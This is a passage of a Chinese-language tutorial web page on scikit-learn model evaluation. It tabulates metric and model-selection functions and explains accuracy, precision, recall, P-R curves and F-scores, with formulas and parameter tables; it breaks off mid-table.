<td align="left">受试者工作特性曲线</td>
</tr>
<tr>
<td align="left">metrics.auc( )</td>
<td align="left">ROC曲线下面积</td>
</tr>
<tr>
<td align="left">metrics.roc_auc_score( )</td>
<td align="left">AUC值</td>
</tr>
</tbody>
</table>
</li>
<li> <p>回归模型评估</p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">metrics.mean_squared_error( )</td>
<td align="left">平均决定误差</td>
</tr>
<tr>
<td align="left">metrics.median_absolute_error( )</td>
<td align="left">中值绝对误差</td>
</tr>
<tr>
<td align="left">metrics.r2_score( )</td>
<td align="left">决定系数</td>
</tr>
</tbody>
</table>
</li>
<li> <p>聚类模型评估</p> 
  <table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">metrics.adjusted_rand_score( )</td>
<td align="left">随机兰德调整指数</td>
</tr>
<tr>
<td align="left">metrics.silhouette_score( )</td>
<td align="left">轮廓系数</td>
</tr>
</tbody>
</table>
</li>
</ul> 
<h4>
<a id="237__414"></a>2.3.7. 模型优化</h4> 
<p><img src="https://images2.imgbox.com/2d/4f/eiUoH0hY_o.png" alt="在这里插入图片描述" width="550"></p> 
<table>
<thead><tr>
<th align="left">函数</th>
<th align="left">功能</th>
</tr></thead>
<tbody>
<tr>
<td align="left">model_selection.cross_val_score( )</td>
<td align="left">交叉验证</td>
</tr>
<tr>
<td align="left">model_selection.LeaveOneOut( )</td>
<td align="left">留一法</td>
</tr>
<tr>
<td align="left">model_selection.LeavePout( )</td>
<td align="left">留P法交叉验证</td>
</tr>
<tr>
<td align="left">model_selection.GridSearchCV( )</td>
<td align="left">网格搜索</td>
</tr>
<tr>
<td align="left">model_selection.RandomizedSearchCV( )</td>
<td align="left">随机搜索</td>
</tr>
<tr>
<td align="left">model_selection.validation_curve( )</td>
<td align="left">验证曲线</td>
</tr>
<tr>
<td align="left">model_selection.learning_curve( )</td>
<td align="left">学习曲线</td>
</tr>
</tbody>
</table>
<h2>
<a id="3__428"></a>3. 评估指标</h2> 
<h3>
<a id="31__430"></a>3.1. 各种算法的评估指标</h3> 
<p><img src="https://images2.imgbox.com/b8/e1/va4vbEQy_o.png" alt="在这里插入图片描述" width="550"></p> 
<h3>
<a id="32__434"></a>3.2. 分类任务</h3> 
<p>二分类问题的<strong>混淆矩阵</strong>：</p> 
<p>TP代表正样本中预测正确的样本个数；FN代表正样本中预测错误的样本个数；FP代表负样本中预测错误的样本个数；TN代表父样本中预测正确的样本个数，以下的公式基本都基于混淆矩阵而言。<br> <img src="https://images2.imgbox.com/4f/78/gpIK4RDW_o.png" alt="在这里插入图片描述" width="300"></p> 
<ol>
<li> <p><strong>准确率</strong>：准确率表示的是<strong>分类正确的比例</strong>(<code>所有样本</code>)，但是在样本不平衡的情况下，并不能作为很好的指标来衡量结果。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
       
        
         
          
           A
          
          
           c
          
          
           c
          
          
           u
          
          
           r
          
          
           a
          
          
           c
          
          
           y
          
          
           =
          
          
           
            
             T
            
            
             P
            
            
             +
            
            
             T
            
            
             N
            
           
           
            
             T
            
            
             P
            
            
             +
            
            
             T
            
            
             N
            
            
             +
            
            
             F
            
            
             P
            
            
             +
            
            
             F
            
            
             N
            
           
          
         
         
           Accuracy=frac{TP+TN}{TP+TN+FP+FN} 
         
        
       </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.87777em;vertical-align: -0.19444em"></span><span class="mord mathdefault">A</span><span class="mord mathdefault">c</span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right: 0.02778em">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.12966em;vertical-align: -0.76933em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.36033em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.76933em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span><br> <strong>对应sklearn包</strong> ：</p> <p><code>sklearn.metrics.accuracy_score(y_true, y_pred, *, normalize=True, sample_weight=None)</code></p> <p><strong>参数</strong>：</p> 
  <table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>y_true</strong></td>
<td align="left">
<strong>1d array-like, or label indicator array / sparse matrix</strong> 真实标签。</td>
</tr>
<tr>
<td align="left"><strong>y_pred</strong></td>
<td align="left">
<strong>1d array-like, or label indicator array / sparse matrix</strong> 预测标签，由分类器返回。</td>
</tr>
<tr>
<td align="left"><strong>normalize</strong></td>
<td align="left">
<strong>bool, optional (default=True)</strong> 如果为False，则返回正确分类的样本数。否则，返回正确分类的样本的分数。</td>
</tr>
<tr>
<td align="left"><strong>sample_weight</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,), default=None</strong> 样本权重。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
  <table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody><tr>
<td align="left"><strong>score</strong></td>
<td align="left">
<strong>float</strong> 如果normalize == True，则返回正确分类的样本的分数（浮点数），否则返回正确分类的样本数（整数）。 最佳性能，在normalize == True时，为1；在normalize == False时，为样本数量。</td>
</tr></tbody>
</table>
</li>
<li> <p><strong>精确率(查准率)</strong>：精确率代表的是预测为<strong>正样本的样本总体</strong>中<strong>预测正确</strong>的占比(<code>正样本</code>)。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
       
        
         
          
           P
          
          
           r
          
          
           e
          
          
           c
          
          
           i
          
          
           s
          
          
           i
          
          
           o
          
          
           n
          
          
           =
          
          
           
            
             T
            
            
             P
            
           
           
            
             T
            
            
             P
            
            
             +
            
            
             F
            
            
             P
            
           
          
         
         
           Precision=frac{TP}{TP+FP} 
         
        
       </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mord mathdefault" style="margin-right: 0.02778em">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.12966em;vertical-align: -0.76933em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.36033em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.76933em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span><br> <strong>对应sklearn包</strong> ：</p> <p><code>sklearn.metrics.precision_score(y_true, y_pred, *, labels=None, pos_label=1, average='binary', sample_weight=None, zero_division='warn')</code></p> <p><strong>参数</strong>：</p> 
  <table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>y_true</strong></td>
<td align="left">
<strong>1d array-like, or label indicator array / sparse matrix</strong> 真实目标值。</td>
</tr>
<tr>
<td align="left"><strong>y_pred</strong></td>
<td align="left">
<strong>1d array-like, or label indicator array / sparse matrix</strong> 分类器返回的估计目标。</td>
</tr>
<tr>
<td align="left"><strong>labels</strong></td>
<td align="left">
<strong>list, optional</strong> 当average！='binary’时要包括的一组标签，如果average是None，则为标签的顺序。可以排除数据中存在的标签，例如，以忽略多数否定类的方式计算多类平均值，而数据中不存在的标签将导致宏平均值中的0成分。对于多标签目标，标签是列索引。 默认情况下，y_true和y_pred中的所有标签均按排序顺序使用。 在版本0.17中进行了更改：针对多类问题改进了参数标签。</td>
</tr>
<tr>
<td align="left"><strong>pos_label</strong></td>
<td align="left">
<strong>str or int, 1 by default</strong> average ='binary’且数据为二进制的报告类。如果数据是多类或多标签的，则将被忽略； 设置labels= [pos_label]和average！='binary’将仅报告该标签的分数。</td>
</tr>
<tr>
<td align="left"><strong>average</strong></td>
<td align="left">
<strong>string, [None|‘binary’ (default)| ‘micro’| ‘macro’| ‘samples’|‘weighted’]</strong> 对于多类/多标签目标，此参数是必需的。如果为None，则返回每个班级的分数。否则，将根据数据的平均表现确定类型： - <strong><code>'binary'</code>:</strong> 仅报告由pos_label指定的类的结果。仅当目标（y_ {true,pred}）为二进制时才适用。 - <strong><code>'micro'</code>:</strong> 通过计算真正例、假负例和假正例的总数来全局计算指标。 - <strong><code>'macro'</code>:</strong> 计算每个标签的指标，并找到其未加权平均值。 没有考虑标签不平衡。 - <strong><code>'weighted'</code>:</strong> 计算每个标签的指标，并找到它们受支持的平均权重（每个标签的真实实例数）。这会更改‘macro’以解决标签不平衡的问题；这可能导致F-score不在精确度和召回率之间。 - <strong><code>'samples'</code>:</strong> 计算每个实例的指标，并找到它们的平均值（仅对不同于<a href="https://scikit-learn.org.cn/view/476.html"><code>accuracy_score</code></a>的多标签分类有意义）。</td>
</tr>
<tr>
<td align="left"><strong>sample_weight</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,), default=None</strong> 样本权重。</td>
</tr>
<tr>
<td align="left"><strong>zero_division</strong></td>
<td align="left">
<strong>“warn”, 0 or 1, default=”warn”</strong> 设置零分频时返回的值。如果设置为“ warn”，则该值为0，但也会发出警告。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
  <table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody><tr>
<td align="left"><strong>precision</strong></td>
<td align="left">
<strong>float (if average is not None) or array of float, shape = [n_unique_labels]</strong> 二进制分类中正类的精度，或者多类任务的每个类的精度的加权平均值。</td>
</tr></tbody>
</table>
</li>
<li> <p><strong>召回率(查全率)</strong>：召回率代表的是实际为<strong>正样本的样本总体</strong>中<strong>预测正确</strong>的占比。精确度与召回率是一对矛盾的度量，一般来说，精确率高的时候，召回率往往偏低；精确率低的时候，召回率往往偏高。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
       
        
         
          
           R
          
          
           e
          
          
           c
          
          
           a
          
          
           l
          
          
           l
          
          
           =
          
          
           
            
             T
            
            
             P
            
           
           
            
             T
            
            
             P
            
            
             +
            
            
             F
            
            
             N
            
           
          
         
         
           Recall=frac{TP}{TP+FN} 
         
        
       </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.69444em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.12966em;vertical-align: -0.76933em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.36033em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="mord mathdefault" style="margin-right: 0.10903em">N</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">T</span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.76933em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span><br> <strong>对应sklearn包</strong> ：</p> <p><code>sklearn.metrics.recall_score(y_true, y_pred, *, labels=None, pos_label=1, average='binary', sample_weight=None, zero_division='warn')</code></p> <p><strong>参数</strong>：</p> 
  <table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>y_true</strong></td>
<td align="left">
<strong>1d array-like, or label indicator array / sparse matrix</strong> 真实目标值。</td>
</tr>
<tr>
<td align="left"><strong>y_pred</strong></td>
<td align="left">
<strong>1d array-like, or label indicator array / sparse matrix</strong> 分类器返回的估计目标。</td>
</tr>
<tr>
<td align="left"><strong>labels</strong></td>
<td align="left">
<strong>list, optional</strong> 当average！='binary’时要包括的一组标签，如果average是None，则是标签的顺序。可以排除数据中存在的标签，例如，以忽略多数否定类的方式计算多类平均值，而数据中不存在的标签将导致宏平均值中的0成分。对于多标签目标，标签是列索引。 默认情况下，y_true和y_pred中的所有标签均按排序顺序使用。 在版本0.17中进行了更改：针对多类问题改进了参数标签。</td>
</tr>
<tr>
<td align="left"><strong>pos_label</strong></td>
<td align="left">
<strong>str or int, 1 by default</strong> average ='binary’且数据为二进制的报告类。如果数据是多类或多标签的，则将被忽略； 设置labels=[pos_label]和average！='binary’将仅报告该标签的分数。</td>
</tr>
<tr>
<td align="left"><strong>average</strong></td>
<td align="left">
<strong>string, [None|‘binary’ (default)| ‘micro’| ‘macro’| ‘samples’|‘weighted’]</strong> 对于多类/多标签目标，此参数是必需的。如果为None，则返回每个类的得分。否则，将根据数据的平均表现确定类型： - <strong><code>'binary'</code>:</strong> 仅报告由pos_label指定的类的结果。仅当目标（y_ {true，pred}）为二进制时才适用。 - <strong><code>'micro'</code>:</strong> 通过计算真正例、假负例和假正例的总数来全局计算度量。 - <strong><code>'macro'</code>:</strong> 计算每个标签的度量，并找到其未加权平均值。 这没有考虑标签不平衡。 - <strong><code>'weighted'</code>:</strong> 计算每个标签的度量，并找到它们受支持的平均权重（每个标签的真实实例数）。这会更改‘macro’以解决标签不平衡的问题；这可能导致F-score不在精确度和召回率之间。 - <strong><code>'samples'</code>:</strong> 计算每个实例的度量，并找到它们的平均值（仅对不同于<a href="https://scikit-learn.org.cn/view/476.html"><code>accuracy_score</code></a>的多标签分类有意义）。</td>
</tr>
<tr>
<td align="left"><strong>sample_weight</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,), default=None</strong> 样本权重。</td>
</tr>
<tr>
<td align="left"><strong>zero_division</strong></td>
<td align="left">
<strong>“warn”, 0 or 1, default=”warn”</strong> 设置零分频时返回的值。如果设置为“ warn”，则该值为0，但也会发出警告。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
  <table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody><tr>
<td align="left"><strong>recall</strong></td>
<td align="left">
<strong>float (if average is not None) or array of float, shape = [n_unique_labels]</strong> 二进制分类中的正例类的召回率或多类别任务的每个类别的召回率加权平均</td>
</tr></tbody>
</table>
</li>
<li> <p><strong>P-R曲线</strong>：以查准率为纵轴，查全率为横轴，就得到了查准率-查全率曲线，又被称为P-R曲线。P-R曲线能直观地显示出学习器在样本总体上的查全率、查准率。如下图，学习器A优于学习器C(学习器A的曲线完全包住学习器C)，但是学习器A与B很难比较，因为出现了交叉，平衡点(BEP)也就是查准率等于查全率的时候，对应的坐标值，坐标值大的相对优一点。但BEP过于简化，因此常用F1。<br> <img src="https://images2.imgbox.com/c8/e4/cAvXPabC_o.png" alt="在这里插入图片描述" width="350"></p> <p><strong>对应sklearn包</strong> ：</p> <p><code>sklearn.metrics.average_precision_score(y_true, y_score, *, average='macro', pos_label=1, sample_weight=None)</code></p> <p><strong>参数</strong>：</p> 
  <table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>y_true</strong></td>
<td align="left">
<strong>array, shape = [n_samples] or [n_samples, n_classes]</strong> 真正的二进制标签或二进制标签指示符。</td>
</tr>
<tr>
<td align="left"><strong>y_score</strong></td>
<td align="left">
<strong>array, shape = [n_samples] or [n_samples, n_classes]</strong> 目标分数可以是肯定类别的概率估计值，置信度值或决策的非阈值度量（如某些分类器上的“ decision_function”所返回）。</td>
</tr>
<tr>
<td align="left"><strong>average</strong></td>
<td align="left">
<strong>string, [None, ‘micro’, ‘macro’ (default), ‘samples’, ‘weighted’]</strong> 如果为None，则返回每类的得分。否则，将确定对数据平均表现的类型： - <strong>‘micro’：</strong> 通过将标签指标矩阵的每个元素都视为标签来全局计算指标。 - <strong>‘macro’：</strong> 计算每个标签的指标，并找到其未加权平均值。此处没有考虑标签不平衡问题。 - <strong>‘weighted’：</strong> 计算每个标签的指标，并找到它们的平均值，然后按支持度（每个标签的真实实例数）加权。 - <strong>‘samples’：</strong> 计算每个实例的指标，并找到它们的平均值。 当y_true为二进制时将被忽略。</td>
</tr>
<tr>
<td align="left"><strong>pos_label</strong></td>
<td align="left">
<strong>int or str (default=1)</strong> 正向类别的标签。仅适用于二进制y_true。 对于multilabel-indicator y_true，pos_label固定为1。</td>
</tr>
<tr>
<td align="left"><strong>sample_weight</strong></td>
<td align="left">
<strong>array-like of shape (n_samples,), default=None</strong> 样本权重。</td>
</tr>
</tbody>
</table>
<p><strong>返回值</strong>：</p> 
  <table>
<thead><tr>
<th align="left">返回值</th>
<th align="left">说明</th>
</tr></thead>
<tbody><tr>
<td align="left"><strong>average_precision</strong></td>
<td align="left"><strong>float</strong></td>
</tr></tbody>
</table>
</li>
<li> <p><strong>F值</strong>：当需要在精确率与召回率之间进行权衡时，F1曲线同时考虑了两者，可以作为一种评价指标，它是精确率和召回率的调和平均数。当β &gt; 1时，召回率的权重高于精确率，当β &lt; 1时精确率的权重高于召回率，当β = 1时，就变成了F1值。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
       
        
         
          
           
            F
           
           
            β
           
          
          
           =
          
          
           (
          
          
           1
          
          
           +
          
          
           
            β
           
           
            2
           
          
          
           )
          
          
           ⋅
          
          
           
            
             P
            
            
             r
            
            
             e
            
            
             c
            
            
             i
            
            
             s
            
            
             i
            
            
             o
            
            
             n
            
            
             ⋅
            
            
             R
            
            
             e
            
            
             c
            
            
             a
            
            
             l
            
            
             l
            
           
           
            
             
              β
             
             
              2
             
            
            
             ⋅
            
            
             P
            
            
             r
            
            
             e
            
            
             c
            
            
             i
            
            
             s
            
            
             i
            
            
             o
            
            
             n
            
            
             +
            
            
             R
            
            
             e
            
            
             c
            
            
             a
            
            
             l
            
            
             l
            
           
          
         
         
           F_beta=(1+beta^2)cdotfrac{Precision cdot Recall}{beta^2 cdot Precision + Recall} 
         
        
       </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.969438em;vertical-align: -0.286108em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em"><span class="" style="margin-left: -0.13889em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05278em">β</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 1.11411em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.864108em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 2.25188em;vertical-align: -0.88044em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.37144em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.740108em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mord mathdefault" style="margin-right: 0.02778em">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mord mathdefault" style="margin-right: 0.02778em">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.88044em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span><br> <strong>F1</strong>:<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
       
        
         
          
           
            F
           
           
            1
           
          
          
           =
          
          
           
            
             2
            
            
             ⋅
            
            
             P
            
            
             r
            
            
             e
            
            
             c
            
            
             i
            
            
             s
            
            
             i
            
            
             o
            
            
             n
            
            
             ⋅
            
            
             R
            
            
             e
            
            
             c
            
            
             a
            
            
             l
            
            
             l
            
           
           
            
             P
            
            
             r
            
            
             e
            
            
             c
            
            
             i
            
            
             s
            
            
             i
            
            
             o
            
            
             n
            
            
             +
            
            
             R
            
            
             e
            
            
             c
            
            
             a
            
            
             l
            
            
             l
            
           
          
         
         
           F_1=frac{2cdot Precision cdot Recall}{Precision + Recall} 
         
        
       </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.13889em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 2.14077em;vertical-align: -0.76933em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.37144em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mord mathdefault" style="margin-right: 0.02778em">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord">2</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.13889em">P</span><span class="mord mathdefault" style="margin-right: 0.02778em">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.76933em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></span><br> <strong>对应sklearn包</strong> ：</p> <p><code>sklearn.metrics.f1_score(y_true, y_pred, *, labels=None, pos_label=1, average='binary', sample_weight=None, zero_division='warn')</code></p> <p><strong>参数</strong>：</p> 
  <table>
<thead><tr>
<th align="left">参数</th>
<th align="left">说明</th>
</tr></thead>
<tbody>
<tr>
<td align="left"><strong>y_true</strong></td>
<td align="left">
<strong>1d array-like, or label indicator array / sparse matrix</strong> 真实目标值。</td>
</tr>
<tr>
<td align="left"><strong>y_pred</strong></td>
<td align="left">
<strong>1d array-like, or label indicator array / sparse matrix</strong> 分类器返回的估计目标。</td>
</tr>
<tr>
<td align="left"><strong>labels</strong></td>
